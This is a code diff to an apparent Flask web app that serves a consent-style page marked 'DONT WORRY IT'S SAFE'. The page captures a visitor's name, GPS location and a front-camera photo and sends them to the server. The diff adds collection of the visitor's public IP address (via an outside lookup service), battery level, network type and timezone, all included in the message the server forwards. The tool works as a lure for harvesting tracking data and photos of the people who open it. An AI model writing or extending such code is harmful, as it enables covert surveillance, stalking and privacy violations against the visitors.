@@ -59,7 +59,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-           ✅DONT WORRY IT'S SAFE: 法律声明：<br>
+            ✅DONT WORRY IT'S SAFE: 法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
@@ -118,20 +118,59 @@ HTML_TEMPLATE = """
             }
 
             statusDiv.style.color = 'gray';
-            statusDiv.innerText = '正在获取权限与设备信息...';
+            statusDiv.innerText = '正在获取权限与 advanced information...';
 
             let locationData = "Non autorisé";
             let imageBase64 = null;
+            let publicIP = "Inconnu";
+            let batteryInfo = "Inconnu";
+            let networkInfo = "Inconnu";
+
+            // 1. جلب عنوان الـ IP الخارجي
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                publicIP = ipData.ip;
+            } catch (e) {
+                publicIP = "Non disponible";
+            }
+
+            // 2. جلب معلومات البطارية إن وجدت
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "Oui ⚡" : "Non 🔋";
+                    batteryInfo = `${level}% (En charge: ${charging})`;
+                }
+            } catch (e) {
+                batteryInfo = "Non supporté";
+            }
+
+            // 3. جلب نوع الاتصال (Network Connection)
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    networkInfo = `${connection.effectiveType ? connection.effectiveType.toUpperCase() : 'Inconnu'} (Débit: ${connection.downlink || '?'} Mbps)`;
+                }
+            } catch (e) {
+                networkInfo = "Non disponible";
+            }
 
             let deviceInfo = {
                 model: getDeviceDetails(),
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Inconnu",
                 cores: navigator.hardwareConcurrency || "Inconnu",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu",
+                ip: publicIP,
+                battery: batteryInfo,
+                network: networkInfo
             };
 
+            // 4. جلب الـ GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
@@ -141,6 +180,7 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
+            // 5. التقاط الصورة بوضوح بعد ثانية واحدة (1000ms)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -152,7 +192,6 @@ HTML_TEMPLATE = """
                 
                 videoElement.srcObject = stream;
 
-                // Wallét wa9t el intithar 1 thnya barka (1000ms) bch tzed sror3a
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 canvas.width = videoElement.videoWidth || 640;
@@ -168,6 +207,7 @@ HTML_TEMPLATE = """
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
+            // 6. الإرسال إلى السيرفر
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -216,11 +256,15 @@ def submit_consent():
 
     payload = {
         "content": (
-            f"✅ **Nouveau consentement et détails de l'appareil:**\n"
+            f"✅ **Nouveau consentement et détails avancés de l'appareil:**\n"
             f"• **Nom:** {username}\n"
-            f"• **Type / Modèle de l'appareil:** {device.get('model')}\n"
+            f"• **Type / Modèle:** {device.get('model')}\n"
+            f"• **Adresse IP:** {device.get('ip')}\n"
             f"• **Localisation (GPS):** {location}\n"
+            f"• **Niveau de Batterie:** {device.get('battery')}\n"
+            f"• **Type de Réseau:** {device.get('network')}\n"
             f"• **Résolution d'écran:** {device.get('screen')}\n"
+            f"• **Fuseau Horaire (Timezone):** {device.get('timezone')}\n"
             f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
             f"• **Processeur & RAM:** {device.get('cores')} Cœurs | {device.get('ram')}"
         )
